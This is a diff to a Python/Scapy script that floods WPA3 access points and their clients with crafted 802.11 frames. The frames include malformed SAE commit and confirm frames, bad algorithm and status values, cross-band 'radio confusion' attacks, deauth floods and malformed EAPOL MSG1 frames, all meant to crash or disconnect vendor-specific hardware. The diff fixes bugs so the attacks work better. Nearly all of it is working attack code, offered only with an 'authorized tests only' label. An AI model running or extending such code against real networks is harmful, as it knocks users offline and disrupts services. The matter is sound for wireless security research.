@@ -10,11 +10,12 @@ FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
 CORRECTIONS (aligned with paper):
 - Case I: single SAE Commit frame, repeated every 30s
 - Case II: uses target STA MAC (not random)
-- Case III/IV: confirm payload length fixed to 32 bytes
-- Case VI/Reverse: correct target BSSID per phase
+- Case III/IV: confirm payload length fixed to 34 bytes total (2 + 32)
+- Case VI/Reverse: correct target BSSID & SAE parameters per phase
 - Case VII: two‑phase (flood + STA‑spoof)
 - PMF: sends a burst of ~60 deauths, 1s wait (SA Query timeout)
 - Cookie Guzzler: same MAC per burst
+- EAPOL frames correctly set via SNAP(OUI=0x000000, code=0x888E)
 ================================================================================
 """
 import subprocess
@@ -26,7 +27,7 @@ import random
 from multiprocessing import Process, Value, Manager, Lock
 from scapy.all import (
     RadioTap, Dot11, Dot11Auth, Dot11Deauth, EAPOL,
-    sendp, RandMAC, Raw
+    sendp, RandMAC, Raw, LLC, SNAP
 )
 
 # =====================================================================================
@@ -178,7 +179,7 @@ def parse_airodump_csv(csv_file):
         for line in lines:
             if 'BSSID' in line or line.startswith('#') or not line.strip():
                 continue
-            parts = [p.strip() for p in line.split(',')]
+            parts =[p.strip() for p in line.split(',')]
             if len(parts) >= 14:
                 bssid = parts[0].upper()
                 channel = parts[3].strip()
@@ -188,8 +189,8 @@ def parse_airodump_csv(csv_file):
                     results['2.4GHz'] = channel
                 elif bssid == TARGET_BSSID_5GHZ.upper() and 36 <= channel_int <= 165:
                     results['5GHz'] = channel
-    except Exception as e:
-        print(f"[SCANNER PARSE ERROR] {e}")
+    except Exception:
+        pass
     return results
 
 def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
@@ -202,7 +203,7 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
         try:
             timestamp = int(time.time())
             prefix = f"/tmp/scan_{timestamp}"
-            cmd = ['airodump-ng', '--write', prefix, '--output-format', 'csv',
+            cmd =['airodump-ng', '--write', prefix, '--output-format', 'csv',
                    '--band', 'abg', '--write-interval', '2', scanner_iface]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(scan_duration)
@@ -213,7 +214,7 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
                 latest_csv = max(csv_files, key=os.path.getctime)
                 found = parse_airodump_csv(latest_csv)
                 with lock:
-                    for band in ['2.4GHz', '5GHz']:
+                    for band in['2.4GHz', '5GHz']:
                         if found.get(band):
                             old, new = shared_dict.get(band), found[band]
                             if old != new:
@@ -224,13 +225,11 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
                 except: pass
             time.sleep(max(0, interval - scan_duration))
         except KeyboardInterrupt: break
-        except Exception as e:
-            print(f"[SCANNER ERROR] {e}")
+        except Exception:
             time.sleep(5)
 
 def set_channel_scientific(interface: str, channel: str) -> bool:
-    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],
-                ['iwconfig', interface, 'channel', str(channel)]]:
+    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],['iwconfig', interface, 'channel', str(channel)]]:
         try:
             if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
                 time.sleep(0.1)
@@ -260,22 +259,13 @@ def create_sae_payload_bytes(scalar: bytes, finite: bytes) -> bytes:
     return b'\x13\x00' + scalar[:32] + finite[:64]
 
 def get_random_sae_bytes(scalar_list, finite_list):
-    """
-    Safely pick a valid hex string PAIR from lists and convert to bytes.
-    CRITICAL: Scalar and Finite MUST be picked from the same index 
-    to remain a mathematically valid cryptographic pair!
-    """
-    valid_pairs = [
+    valid_pairs =[
         (s, f) for s, f in zip(scalar_list, finite_list)
         if "INSERT" not in s and len(s) == 64 
         and "INSERT" not in f and len(f) == 128
     ]
-    
-    if not valid_pairs:
-        return None, None
-        
+    if not valid_pairs: return None, None
     s_hex, f_hex = random.choice(valid_pairs)
-    
     return bytes.fromhex(s_hex), bytes.fromhex(f_hex)
 
 def cleanup(procs):
@@ -284,16 +274,15 @@ def cleanup(procs):
             p.terminate(); p.join(timeout=1)
             if p.is_alive(): p.kill()
 
-MAC_POOL = [str(RandMAC()) for _ in range(5000)]
+MAC_POOL =[str(RandMAC()) for _ in range(5000)]
 def get_fast_randmac():
     return random.choice(MAC_POOL)
 
 # =====================================================================================
-# ======================== ATTACK FUNCTIONS (PAPER-ALIGNED) ===========================
+# ======================== VENDOR SPECIFIC ATTACKS ====================================
 # =====================================================================================
 
 def run_case1_process(iface, cnt, **kw):
-    """Case I — Denial of Internet (single SAE Commit frame, repeated every 30s)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
@@ -312,14 +301,13 @@ def run_case1_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case2_process(iface, cnt, **kw):
-    """Case II — Bad Auth Algorithm Broadcom (uses target STA MAC instead of random)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     print(f"[CASE2] {iface}: Bad Algo Broadcom (with STA MACs)...")
     if not set_channel_scientific(iface, ch): return
     try:
         while True:
-            burst = []
+            burst =[]
             for c in cls:
                 burst.append(RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=5, seqnum=1, status=0))
             send_burst_scientific(burst * (128 // len(burst) + 1), iface, cnt)
@@ -327,31 +315,28 @@ def run_case2_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case3_process(iface, cnt, **kw):
-    """Case III — Bad Status Code (confirm payload fixed to 34 bytes)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     print(f"[CASE3] {iface}: Bad Status Code...")
     if not set_channel_scientific(iface, ch): return
     try:
         while True:
-            PAYLOAD = Raw(b'\x00\x00' + os.urandom(32))   # 2 + 32 = 34 bytes
+            PAYLOAD = Raw(b'\x00\x00' + os.urandom(32))   # EXACTLY 34 bytes total (2 + 32)
             send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD for c in cls]*64, iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_case4_process(iface, cnt, **kw):
-    """Case IV — Bad Send-Confirm (confirm payload fixed to 34 bytes)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     print(f"[CASE4] {iface}: Bad Send-Confirm...")
     if not set_channel_scientific(iface, ch): return
     try:
         while True:
-            PAYLOAD = Raw(b'\x11\x11' + os.urandom(32))
+            PAYLOAD = Raw(b'\x11\x11' + os.urandom(32))   # EXACTLY 34 bytes total (2 + 32)
             send_burst_scientific([RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD for c in cls]*64, iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_case5_process(iface, cnt, **kw):
-    """Case V — Empty Frame (no payload)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     print(f"[CASE5] {iface}: Empty Frame...")
@@ -362,91 +347,85 @@ def run_case5_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case6_radio_confusion_process(iface, cnt, **kw):
-    """Case VI — Radio Confusion: Phase1 (2.4GHz) targets 2.4GHz BSSID, Phase2 (5GHz) targets 5GHz BSSID."""
     ch_24, ch_5 = kw['channel_2_4ghz'], kw['channel_5ghz']
     bssid_24, bssid_5 = kw['bssid_2_4ghz'], kw['bssid_5ghz']
-    cls = kw.get('clients', [])
+    cls = kw.get('clients',[])
     if not (ch_24 and ch_5 and cls): return
     print(f"[CASE6] {iface}: TWO-PHASE Radio Confusion (Crash 5GHz)...")
     try:
         while True:
-            # PHASE 1: Stress on 2.4 GHz targeting 2.4GHz BSSID
+            # Phase 1: Sender is on 2.4GHz. Target is 2.4GHz BSSID. Must use 2.4GHz parameters!
             if set_channel_scientific(iface, ch_24):
                 for _ in range(300):
-                    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+                    s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
                     if not s: continue
                     payload = Raw(create_sae_payload_bytes(s, f))
-                    burst = [RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+                    burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                     time.sleep(0.1)
-            # PHASE 2: Attack on 5 GHz targeting 5GHz BSSID
+            # Phase 2: Sender is on 5GHz. Target is 5GHz BSSID. Must use 5GHz parameters!
             if set_channel_scientific(iface, ch_5):
                 for _ in range(200):
-                    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+                    s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
                     if not s: continue
                     payload = Raw(create_sae_payload_bytes(s, f))
-                    burst = [RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+                    burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                     time.sleep(0.1)
     except KeyboardInterrupt: pass
 
 def run_case6_reverse_process(iface, cnt, **kw):
-    """Case VI Reverse — Radio Confusion: Phase1 (5GHz) targets 5GHz BSSID, Phase2 (2.4GHz) targets 2.4GHz BSSID + PMF."""
     ch_24, ch_5 = kw['channel_2_4ghz'], kw['channel_5ghz']
     bssid_24, bssid_5 = kw['bssid_2_4ghz'], kw['bssid_5ghz']
-    cls = kw.get('clients', [])
+    cls = kw.get('clients',[])
     if not (ch_24 and ch_5 and cls): return
     print(f"[CASE6-REV] {iface}: TWO-PHASE Reverse + PMF (Crash 2.4GHz)...")
     try:
         while True:
-            # PHASE 1: Stress on 5 GHz targeting 5GHz BSSID
+            # Phase 1: Sender is on 5GHz. Target is 5GHz BSSID. Must use 5GHz parameters!
             if set_channel_scientific(iface, ch_5):
                 for _ in range(300):
-                    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+                    s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
                     if not s: continue
                     payload = Raw(create_sae_payload_bytes(s, f))
-                    burst = [RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+                    burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                     time.sleep(0.1)
-            # PHASE 2: Attack on 2.4 GHz targeting 2.4GHz BSSID
+            # Phase 2: Sender is on 2.4GHz. Target is 2.4GHz BSSID. Must use 2.4GHz parameters!
             if set_channel_scientific(iface, ch_24):
                 p2_start = time.time()
                 for _ in range(200):
-                    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+                    s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
                     if not s: continue
                     payload = Raw(create_sae_payload_bytes(s, f))
-                    burst = [RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+                    burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                     time.sleep(0.1)
                     if time.time()-p2_start > 40: break
-            # PHASE 3: PMF Amplification
             time.sleep(10)
             for rnd in range(2):
-                deauth = [RadioTap()/Dot11(addr1=c, addr2=bssid_24, addr3=bssid_24)/Dot11Deauth(reason=3) for c in cls]
+                deauth =[RadioTap()/Dot11(addr1=c, addr2=bssid_24, addr3=bssid_24)/Dot11Deauth(reason=3) for c in cls]
                 send_burst_scientific(deauth*60, iface, cnt)
                 time.sleep(1.0)
     except KeyboardInterrupt: pass
 
 def run_case7_process(iface, cnt, **kw):
-    """Case VII — Back to the Future (two phases: flood with random MACs, then single frames with STA MACs)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
     print(f"[CASE7] {iface}: Back to the Future (2‑phase)...")
-    phase1_bursts = 600  # ~3 min of flooding
+    phase1_bursts = 600
     try:
         burst_count = 0
         while True:
             if burst_count < phase1_bursts:
-                # Phase 1: flood with random MACs
                 s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                 if s:
                     payload = Raw(create_sae_payload_bytes(s, f))
-                    burst = [RadioTap()/Dot11(addr1=b, addr2=str(RandMAC()), addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for _ in range(128)]
+                    burst =[RadioTap()/Dot11(addr1=b, addr2=get_fast_randmac(), addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for _ in range(128)]
                     send_burst_scientific(burst, iface, cnt)
                 burst_count += 1
             else:
-                # Phase 2: single frames with each STA MAC
                 for c in cls:
                     s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                     if s:
@@ -456,11 +435,10 @@ def run_case7_process(iface, cnt, **kw):
                         with cnt.get_lock():
                             cnt.value += 1
                         time.sleep(0.05)
-                burst_count = 0   # reset for next cycle
+                burst_count = 0
     except KeyboardInterrupt: pass
 
 def run_case8_process(iface, cnt, **kw):
-    """Case VIII — Bad Auth Algorithm Qualcomm (algo 0 or 7-65535, bursts with STA MACs)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
@@ -471,7 +449,6 @@ def run_case8_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case9_process(iface, cnt, **kw):
-    """Case IX — Bad Sequence Number (algo 0/3, seq=3, bursts with STA MACs)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
@@ -481,12 +458,11 @@ def run_case9_process(iface, cnt, **kw):
             s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
             if not s: continue
             payload = Raw(create_sae_payload_bytes(s, f))
-            burst = [RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.choice([0,3]), seqnum=3, status=0)/payload for c in cls]
+            burst =[RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=random.choice([0,3]), seqnum=3, status=0)/payload for c in cls]
             send_burst_scientific(burst*20, iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_case10a_process(iface, cnt, **kw):
-    """Case Xa — Bad Auth Body Empty."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
@@ -497,7 +473,6 @@ def run_case10a_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case10b_process(iface, cnt, **kw):
-    """Case Xb — Bad Auth Body Payload."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     BAD = Raw(bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296'))
@@ -509,7 +484,6 @@ def run_case10b_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case11_process(iface, cnt, **kw):
-    """Case XI — Sequence and Status Code Fuzz (paper-aligned)."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     c0 = cls[0]
@@ -519,7 +493,7 @@ def run_case11_process(iface, cnt, **kw):
         while True:
             for seq in range(2):
                 st = 0
-                burst = []
+                burst =[]
                 for i in range(1000):
                     if i%100==0: st = (st%11)+1
                     burst.append(RadioTap()/Dot11(addr1=b, addr2=c0, addr3=b)/Dot11Auth(algo=0, seqnum=seq, status=st))
@@ -529,48 +503,51 @@ def run_case11_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_case12_process(iface, cnt, **kw):
-    """Case XII — Bursty Auth MediaTek."""
     b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
     print(f"[CASE12] {iface}: Bursty Auth MediaTek...")
     try:
         while True:
-            burst = []
+            burst =[]
             for c in cls:
                 for a in range(1,5): burst.append(RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=a, seqnum=1, status=0))
             send_burst_scientific(burst*25, iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_case13_process(iface, cnt, **kw):
-    """Case XIII — MediaTek Cross-Band (send on 5GHz targeting 2.4GHz BSSID)."""
     ch_send, tgt, cls = kw.get('channel_5ghz'), kw.get('bssid_2_4ghz'), kw.get('clients',[])
     if not (ch_send and tgt and cls): return
     if not set_channel_scientific(iface, ch_send): return
     print(f"[CASE13] {iface}: MediaTek Cross-Band (Crash 2.4GHz)...")
     try:
         while True:
-            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+            # Sender is on 5GHz. Must use 5GHz parameters!
+            s, f = get_random_sae_bytes(SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST)
             if not s: continue
             payload = Raw(create_sae_payload_bytes(s, f))
-            burst = [RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+            burst =[RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
             if burst: send_burst_scientific(burst*64, iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_case13_reverse_process(iface, cnt, **kw):
-    """Case XIII Reverse — MediaTek Cross-Band (send on 2.4GHz targeting 5GHz BSSID)."""
     ch_send, tgt, cls = kw.get('channel_2_4ghz'), kw.get('bssid_5ghz'), kw.get('clients',[])
     if not (ch_send and tgt and cls): return
     if not set_channel_scientific(iface, ch_send): return
     print(f"[CASE13-REV] {iface}: MediaTek Cross-Band Rev (Crash 5GHz)...")
     try:
         while True:
-            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
+            # Sender is on 2.4GHz. Must use 2.4GHz parameters!
+            s, f = get_random_sae_bytes(SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST)
             if not s: continue
             payload = Raw(create_sae_payload_bytes(s, f))
-            burst = [RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
+            burst =[RadioTap()/Dot11(addr1=tgt, addr2=c, addr3=tgt)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
             if burst: send_burst_scientific(burst*64, iface, cnt)
     except KeyboardInterrupt: pass
+
+# =====================================================================================
+# ======================== DIRECT / EAPOL ATTACKS =====================================
+# =====================================================================================
 
 def run_deauth_process(iface, cnt, **kw):
     b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
@@ -579,7 +556,7 @@ def run_deauth_process(iface, cnt, **kw):
     print(f"[DEAUTH] {iface}: Deauth Flood...")
     try:
         while True:
-            burst = []
+            burst =[]
             for c in cls:
                 burst.extend([RadioTap()/Dot11(addr1=c,addr2=b,addr3=b)/Dot11Deauth(reason=7),
                               RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Deauth(reason=7)])
@@ -587,29 +564,54 @@ def run_deauth_process(iface, cnt, **kw):
     except KeyboardInterrupt: pass
 
 def run_pmf_process(iface, cnt, **kw):
-    """PMF Deauth Exploit (burst of ~60 deauths, wait 1s)."""
     b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
     if not cls: return
     if not set_channel_scientific(iface, ch): return
     print(f"[PMF] {iface}: PMF Deauth Exploit (burst & wait)...")
     try:
         while True:
-            deauth = []
+            deauth =[]
             for c in cls:
                 deauth.append(RadioTap()/Dot11(addr1=c, addr2=b, addr3=b)/Dot11Deauth(reason=3))
             send_burst_scientific(deauth * (60 // len(deauth) + 1), iface, cnt)
             time.sleep(1.5)
     except KeyboardInterrupt: pass
 
-def run_malformed_process(iface, cnt, **kw):
+def run_malformed_length_process(iface, cnt, **kw):
     b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
     if not cls: return
     payload = Raw(b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80))
     if not set_channel_scientific(iface, ch): return
-    print(f"[MALFORMED] {iface}: Malformed MSG1...")
+    print(f"[MALFORMED_LENGTH] {iface}: Malformed MSG1 Length...")
     try:
         while True:
-            send_burst_scientific([RadioTap()/Dot11(type=2,subtype=8,addr1=c,addr2=b,addr3=b)/EAPOL(version=1,type=3)/payload for c in cls]*10, iface, cnt)
+            # FIX: SNAP(OUI=0x000000, code=0x888E) sets correct Ethertype for EAPOL
+            send_burst_scientific([RadioTap()/Dot11(type=2,subtype=8,addr1=c,addr2=b,addr3=b)/LLC()/SNAP(OUI=0x000000, code=0x888E)/payload for c in cls]*10, iface, cnt)
+    except KeyboardInterrupt: pass
+
+def run_malformed_flags_process(iface, cnt, **kw):
+    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
+    if not cls: return
+    if not set_channel_scientific(iface, ch): return
+    print(f"[MALFORMED_FLAGS] {iface}: Malformed MSG1 Flags...")
+
+    eapol_header = b'\x01\x03\x00\x5f'
+    key_desc = b'\x02' 
+    key_info = b'\x03\x8a' # Manipulated flags (e.g. Secure + MIC + Install in msg 1)
+    key_len = b'\x00\x10'
+    replay_cnt = b'\x00\x00\x00\x00\x00\x00\x00\x01'
+    nonce = b'\x01' * 32
+    iv = b'\x00' * 16
+    rsc = b'\x00' * 8
+    mic = b'\x00' * 16
+    key_data_len = b'\x00\x00'
+    key_data = b'' 
+
+    payload = Raw(eapol_header + key_desc + key_info + key_len + replay_cnt + nonce + iv + rsc + mic + key_data_len + key_data)
+    try:
+        while True:
+            send_burst_scientific([RadioTap()/Dot11(type=2, subtype=8, addr1=c, addr2=b, addr3=b)/LLC()/SNAP(OUI=0x000000, code=0x888E)/payload for c in cls]*10, iface, cnt)
+            time.sleep(0.5)
     except KeyboardInterrupt: pass
 
 def run_bad_algo_process(iface, cnt, **kw):
@@ -618,7 +620,7 @@ def run_bad_algo_process(iface, cnt, **kw):
     print(f"[BAD_ALGO] {iface}: Bad Algo Generic...")
     try:
         while True:
-            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=random.choice([0,1,2,4,5])) for _ in range(128)], iface, cnt)
+            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=random.choice([0,1,2,4,5])) for _ in range(128)], iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_bad_seq_process(iface, cnt, **kw):
@@ -630,7 +632,7 @@ def run_bad_seq_process(iface, cnt, **kw):
             s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
             if not s: continue
             payload = Raw(create_sae_payload_bytes(s, f))
-            burst = [RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=random.choice([0,3,4]),status=0)/payload for _ in range(128)]
+            burst =[RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=random.choice([0,3,4]),status=0)/payload for _ in range(128)]
             send_burst_scientific(burst, iface, cnt)
     except KeyboardInterrupt: pass
 
@@ -640,7 +642,7 @@ def run_bad_status_process(iface, cnt, **kw):
     print(f"[BAD_STATUS] {iface}: Bad Status Generic...")
     try:
         while True:
-            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=random.randint(108,200)) for _ in range(128)], iface, cnt)
+            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=random.randint(108,200)) for _ in range(128)], iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_empty_confirm_process(iface, cnt, **kw):
@@ -649,21 +651,20 @@ def run_empty_confirm_process(iface, cnt, **kw):
     print(f"[EMPTY_CONFIRM] {iface}: Empty Confirm Generic...")
     try:
         while True:
-            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0) for _ in range(128)], iface, cnt)
+            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0) for _ in range(128)], iface, cnt)
     except KeyboardInterrupt: pass
 
 def run_cookie_process(iface, cnt, **kw):
-    """Cookie Guzzler – Variant I (same MAC per burst)."""
     b, ch = kw.get('bssid'), kw.get('channel')
     if not set_channel_scientific(iface, ch): return
     print(f"[COOKIE] {iface}: Cookie Guzzler (same‑MAC burst)...")
     try:
         while True:
-            mac = str(RandMAC())
+            mac = get_fast_randmac()
             s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
             if not s: continue
             payload = Raw(create_sae_payload_bytes(s, f))
-            burst = [RadioTap()/Dot11(type=0,subtype=11,addr1=b,addr2=mac,addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
+            burst =[RadioTap()/Dot11(type=0,subtype=11,addr1=b,addr2=mac,addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
             send_burst_scientific(burst, iface, cnt)
             time.sleep(0.5)
     except KeyboardInterrupt: pass
@@ -673,7 +674,7 @@ def validate_configuration():
     def valid_b(b): return b and b!="AA:BB:CC:DD:EE:11" and len(b.split(':'))==6
     def has_valid_scalar(lst): return any("INSERT" not in s and len(s) == 64 for s in lst)
     def has_valid_finite(lst): return any("INSERT" not in s and len(s) == 128 for s in lst)
-    errs = []
+    errs =[]
     if not valid_b(TARGET_BSSID_5GHZ): errs.append("Invalid 5GHz BSSID")
     if not valid_b(TARGET_BSSID_2_4GHZ): errs.append("Invalid 2.4GHz BSSID")
     if not has_valid_scalar(SAE_SCALAR_2_4_HEX_LIST): errs.append("Invalid 2.4GHz Scalar List")
@@ -708,6 +709,7 @@ def main():
                   '2.4ghz':{'bssid':TARGET_BSSID_2_4GHZ,'channel':MANUELLER_KANAL_2_4GHZ}}
     
     ATTACKS = {
+        # Vendor Specific
         "case1_denial_of_internet": run_case1_process, "case2_bad_auth_algo_broadcom": run_case2_process,
         "case3_bad_status_code": run_case3_process, "case4_bad_send_confirm": run_case4_process,
         "case5_empty_frame": run_case5_process, "case6_radio_confusion": run_case6_radio_confusion_process,
@@ -716,34 +718,35 @@ def main():
         "case10a_bad_auth_body_empty": run_case10a_process, "case10b_bad_auth_body_payload": run_case10b_process,
         "case11_seq_status_fuzz": run_case11_process, "case12_bursty_auth": run_case12_process,
         "case13_radio_confusion_mediatek": run_case13_process, "case13_radio_confusion_mediatek_reverse": run_case13_reverse_process,
+        # Direct / EAPOL
         "deauth_flood": run_deauth_process, "pmf_deauth_exploit": run_pmf_process,
-        "malformed_msg1": run_malformed_process, "bad_algo": run_bad_algo_process,
-        "bad_seq": run_bad_seq_process, "bad_status_code": run_bad_status_process,
+        "malformed_msg1_length": run_malformed_length_process, "malformed_msg1_flags": run_malformed_flags_process,
+        # Generic
+        "bad_algo": run_bad_algo_process, "bad_seq": run_bad_seq_process, "bad_status_code": run_bad_status_process,
         "empty_frame_confirm": run_empty_confirm_process, "cookie_guzzler": run_cookie_process
     }
     
     procs, counters = {}, {i:Value('i',0) for i in ADAPTER_KONFIGURATION}
-    restart_counters = {i: 0 for i in ADAPTER_KONFIGURATION}
     active_channels = {}
+    warned_interfaces = set()
     
     print(f"\n[INFO] Starting {len(ADAPTER_KONFIGURATION)} attack processes...")
     print("Press Ctrl+C to stop.\n")
     
-    # Client assignment (fixed for all case2/8/9/10/11/12/13)
     def get_clients_for_attack(attack_name):
-        if attack_name in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
+        if attack_name in["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
             return TARGET_STA_MACS_5GHZ_SPECIAL
-        elif attack_name in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
+        elif attack_name in["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
             return TARGET_STA_MACS_2_4GHZ_SPECIAL
-        elif attack_name in ["case2_bad_auth_algo_broadcom", "case8_bad_auth_algo_qualcomm",
